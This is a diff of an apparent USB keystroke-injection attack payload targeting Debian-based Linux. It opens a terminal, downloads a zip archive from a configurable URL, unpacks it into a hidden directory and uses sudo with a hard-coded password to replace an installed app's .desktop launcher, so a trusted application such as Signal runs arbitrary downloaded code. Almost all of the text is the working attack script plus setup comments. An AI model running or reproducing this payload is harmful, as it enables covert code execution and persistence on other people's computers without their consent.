@@ -1,51 +1,55 @@
-* ################################################################
-* #                                                              |
-* # Title        : Edit The Default Real App With An Arbitrary   |
-* # Author       : Aleff                                         |
-* # Version      : 1.0                                           |
-* # Category     : Execution                                     |
-* # Target       : GNU/Linux (Debian based tested)               |
-* #                                                              |
-* ################################################################
+################################################################
+#                                                              #
+# Title        : Edit The Default Real App With An Arbitrary   #
+# Author       : Aleff                                         #
+# Version      : 1.0                                           #
+# Category     : Execution                                     #
+# Target       : GNU/Linux (Debian based tested)               #
+#                                                              #
+################################################################
 
+ATTACKMODE HID
 
-* Requirements:
-*     - sudo permissions
-*     - Internet connection
-*     - Executable app
-*     - '.desktop' file
+# REQUIREMENTS
+#  - sudo permissions
+#  - Internet connection
+#  - Executable app
+#  - '.desktop' file
 
+# NOTE
+#  - The Depends* time depends by the app size, the connection fast and the computer power, you should test it
 
-* Note:
-*     - The Depends* time depends by the app size, the connection fast and the computer power, you should test it
+# VARIABLES
+# - Set the link from wich will be downloaded the zip archive
+ARBITRARY_APP_LINK='example.com'
+# You must set the desktop file path present in the zip file, if i.e. you have the app name Signal and the desktop file path is Signal/files/signal you should put the path Signal/files/signal
+PATH_TO_DESKTOP_FILE='example'
+# You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
+ORIGINAL_DESKTOP_FILE_NAME='example'
+# sudo permissions password needed
+SUDO-PSWD='example'
 
-
-* Open a shell
-QUACK DELAY 2000
+# Open a shell
+QUACK DELAY 1500
 QUACK CTRL-ALT t
 QUACK DELAY 1000
-
-* Set the link from wich will be downloaded the zip archive
-QUACK STRING curl -o ./arbitrary.zip "ARBITRARY_APP_LINK"
+QUACK STRING curl -o ./arbitrary.zip \"$ARBITRARY_APP_LINK\"
 QUACK ENTER
-* Depends*
+
+# Depends*
 QUACK DELAY 5000
 
 QUACK STRING unzip ./arbitrary.zip -d ./.arbitrary
 QUACK ENTER
-* Depends*
+
+# Depends*
 QUACK DELAY 2000
+
 QUACK STRING rm ./arbitrary.zip
 QUACK ENTER
 QUACK DELAY 1000
-
-* You must set the desktop file path present in the zip file, if i.e. you have the app name Signal and the desktop file path is Signal/files/signal you should put the path Signal/files/signal
-* You must know the original desktop name file, if you don't know it you can rich this information download the app on you system and going to /usr/share/applications/ searching this one app, i.e. the desktop file name of Signal application is signal-desktop.desktop, so in this case you should put signal-desktop.desktop
-QUACK STRING sudo mv ./.arbitrary/PATH_TO_DESKTOP_FILE /usr/share/applications/ORIGINAL_DESKTOP_FILE_NAME
+QUACK STRING sudo mv ./.arbitrary/$PATH_TO_DESKTOP_FILE /usr/share/applications/$ORIGINAL_DESKTOP_FILE_NAME; exit
 QUACK ENTER
 QUACK DELAY 1000
-* sudo permissions needed
-QUACK STRING SUDO
+QUACK STRING $SUDO-PSWD
 QUACK ENTER
-QUACK DELAY 4000
-QUACK ALT f4
